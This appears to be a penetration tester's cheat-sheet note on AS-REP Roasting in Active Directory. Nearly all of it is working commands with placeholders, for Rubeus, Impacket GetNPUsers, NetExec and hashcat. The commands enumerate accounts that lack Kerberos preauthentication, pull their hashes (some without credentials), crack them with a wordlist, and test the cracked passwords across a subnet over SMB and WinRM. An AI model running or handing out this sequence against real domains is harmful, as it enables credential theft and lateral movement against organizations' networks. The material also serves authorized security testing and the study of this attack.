---
tags:
  - AS-REP_Roasting
  - Active_Directory
  - Credential_Access
  - Foundational
  - Hashcat
  - Impacket
  - Kerberos
  - Password_Attack
  - Privilege_Escalation
  - Rubeus
  - Windows
---

## AS-REP Roasting
resources: [HackTricks AS-REP Roasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)

> [!info] Target accounts with "Do not require Kerberos preauthentication" enabled. Can be done without credentials if you have a list of usernames.

### Find AS-REP Roastable Accounts
```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth | Select-Object SamAccountName
```

### [Alternate] Find with Hackles (BloodHound)
```bash
python -m hackles -u neo4j -p '<Neo4jPassword>' --asrep
```

### AS-REP Roast with Rubeus [Remote]
```powershell
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
```

```powershell
# Target specific user
.\Rubeus.exe asreproast /user:<Username> /format:hashcat /outfile:asrep_hashes.txt
```

### AS-REP Roast from Kali [Local]
> [!tip] Can be done without credentials - just need valid usernames.

```bash
impacket-GetNPUsers <Domain>/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat -outputfile asrep.txt
```

```bash
# With credentials (finds vulnerable users automatically)
impacket-GetNPUsers <Domain>/<Username>:<Password> -dc-ip <DC_IP> -request -format hashcat -outputfile asrep.txt
```

### [Alternate] AS-REP Roast with NetExec
```bash
nxc ldap <DC_IP> -u <Username> -p '<Password>' --asreproast asrep.txt
```

```bash
# Without credentials (need userlist)
nxc ldap <DC_IP> -u users.txt -p '' --asreproast asrep.txt
```

### [Alternate] Find with nxc_enum
```bash
python -m nxc_enum <DC_IP> -u '<Username>' -p '<Password>' --asreproast
```

### Crack Hashes [Local]
```bash
hashcat -m 18200 asrep.txt rockyou.txt -r /opt/hashcat/rules/best64.rule
```

### Validate Cracked Credentials [Local]
```bash
nxc smb <DC_IP> -u <Username> -p '<CrackedPassword>' -d <Domain>
```

```bash
# Check for admin access across subnet
nxc smb 192.168.1.0/24 -u <Username> -p '<CrackedPassword>' -d <Domain>
```

```bash
# Check WinRM access
nxc winrm <TargetIP> -u <Username> -p '<CrackedPassword>' -d <Domain>
```
